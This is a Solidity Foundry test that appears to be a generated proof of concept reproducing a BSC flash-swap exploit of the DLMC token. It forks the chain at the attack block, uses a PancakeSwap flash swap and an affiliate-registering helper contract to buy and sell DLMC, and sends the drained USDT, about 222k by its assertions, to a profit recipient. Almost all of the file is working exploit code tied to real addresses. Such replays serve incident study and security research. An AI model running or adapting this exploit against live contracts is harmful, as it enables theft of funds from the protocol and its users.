// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x74c4a756933d0f713facb1dea325ef511646c3b1
// Attack Contract : 0x4adbddea5781caccadd9f73f00e07201b541414e
// Vulnerable Contract : N/A
// Attack Tx : 0x151025d3f0a782340a74d30ef33a5fad044b838e74437a803f0652e70c231306
// Block : 106091607
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

library Addresses {
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant attack_path_entry = 0x4adbDDEA5781cAccADD9F73f00E07201b541414e;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_62CEFE_D792 = 0x62cefE76EEcc737D7ee384eFDbAd8D2C53c1d792;
    address internal constant A_701BB7_9699 = 0x701Bb7B460ae231DBBcFA3d87f0aB5B458429699;
    address internal constant attacker_eoa = 0x74c4A756933D0F713FAcB1DeA325eF511646c3B1;
    address internal constant attack_child = 0x8B5A72C4ce0d3a7676ce06B8E42AeB255bBa476e;
    address internal constant created_attack_contract_0A04 = 0xE81Bf6E392ECa9aD594B5452ea53cF7071760a04;
    address internal constant DLMC = 0xF2ca2A3572B26Ae7c479dC7ae36D922113B1bdF2;
}

interface IDLMC {
    function buy(uint256 amount) external;
    function livePrice() external view returns (uint256);
    function registerAffiliate(address affiliate) external;
    function sell(uint256 amount) external;
    function buy() external;
}

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant TX_TIMESTAMP = 1782299710;
    uint256 constant TX_BLOCK_NUMBER = 106091607;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        vm.warp(TX_TIMESTAMP);
        vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);

        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
        attack._deployAttackChild();
        _prepareProfit(address(attack), address(attack.attackChild()));

        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");

        vm.stopPrank();
        _assertProfit();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_701BB7_9699, address(0), Addresses.USDT, "USDT", 222560221693222099016479);
        _expectProfit(Addresses.created_attack_contract_0A04, attack, Addresses.DLMC, "DLMC", 7651708670942671096055);
    }
}

contract OurAttack {
    bytes4 private constant START_ATTACK = bytes4(0x16521e5a);

    AttackChild_1 public attackChild;

    constructor() payable {
        _deployAttackChild();
    }

    receive() external payable {}

    fallback() external payable {}

    function attack() public payable {
        (bool ok,) = address(attackChild)
            .call(
                abi.encodeWithSelector(
                    START_ATTACK,
                    uint256(420000000000000000000000),
                    uint256(1000000000000000000000000),
                    Addresses.A_701BB7_9699
                )
            );
        require(ok, "attack child dispatch failed");
    }

    function _deployAttackChild() public returns (address) {
        if (address(attackChild) != address(0)) return address(attackChild);

        attackChild = new AttackChild_1();
        require(address(attackChild) == Addresses.created_attack_contract_0A04, "unexpected attack child");
        return address(attackChild);
    }
}

contract AttackChild {
    bytes4 private constant BUY_WITH_USDT = bytes4(0xa2608d86);

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == BUY_WITH_USDT) {
            (address dlmc, address usdt, address affiliate, uint256 buyAmount) =
                abi.decode(msg.data[4:], (address, address, address, uint256));
            buyWithApprovedUsdt(dlmc, usdt, affiliate, buyAmount);
            return;
        }
        revert("unsupported helper call");
    }

    function buyWithApprovedUsdt(address dlmc, address usdt, address affiliate, uint256 buyAmount) public payable {
        IDLMC(dlmc).registerAffiliate(affiliate);
        IERC20Like(usdt).approve(dlmc, type(uint256).max);
        IDLMC(dlmc).buy(buyAmount);
    }
}

contract AttackChild_1 {
    bytes4 private constant START_ATTACK = bytes4(0x16521e5a);
    bytes4 private constant BUY_WITH_USDT = bytes4(0xa2608d86);

    bool private callbackComplete;
    uint256 private firstBuyAmount;
    uint256 private helperBuyAmount;
    address private profitRecipient;

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == START_ATTACK) {
            (uint256 firstAmount, uint256 helperAmount, address recipient) =
                abi.decode(msg.data[4:], (uint256, uint256, address));
            executeSwap(firstAmount, helperAmount, recipient);
            return;
        }
        revert("unsupported attack call");
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        sender;
        amount0;
        amount1;
        data;
        flashCallback();
    }

    function flashCallback() public payable {
        if (callbackComplete) return;
        callbackComplete = true;

        IDLMC(Addresses.DLMC).registerAffiliate(Addresses.A_62CEFE_D792);
        IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
        IDLMC(Addresses.DLMC).buy(firstBuyAmount);

        AttackChild affiliateBuyer = new AttackChild();
        require(address(affiliateBuyer) == Addresses.attack_child, "unexpected attack child");

        IERC20Like(Addresses.USDT).transfer(address(affiliateBuyer), helperBuyAmount);
        (bool ok,) = address(affiliateBuyer)
            .call(abi.encodeWithSelector(BUY_WITH_USDT, Addresses.DLMC, Addresses.USDT, address(this), helperBuyAmount));
        require(ok, "affiliate buy failed");

        IDLMC(Addresses.DLMC).livePrice();
        IERC20Like(Addresses.DLMC).balanceOf(address(this));
        IERC20Like(Addresses.USDT).balanceOf(Addresses.DLMC);

        IDLMC(Addresses.DLMC).sell(65908685295332365480640);
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 1423558897243107769423559);

        uint256 profitTokenBalance = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(profitRecipient, profitTokenBalance);
    }

    function executeSwap(uint256 firstAmount, uint256 helperAmount, address recipient) internal {
        firstBuyAmount = firstAmount;
        helperBuyAmount = helperAmount;
        profitRecipient = recipient;

        // They are modeled here as normal Solidity state assignment; no trace-backed protocol call exists.
        IUniswapV2PairLike(Addresses.Cake_LP)
            .swap(
                firstAmount + helperAmount,
                0,
                Addresses.created_attack_contract_0A04,
                hex"0000000000000000000000000000000000000000000000000000000000000001"
            );
    }
}
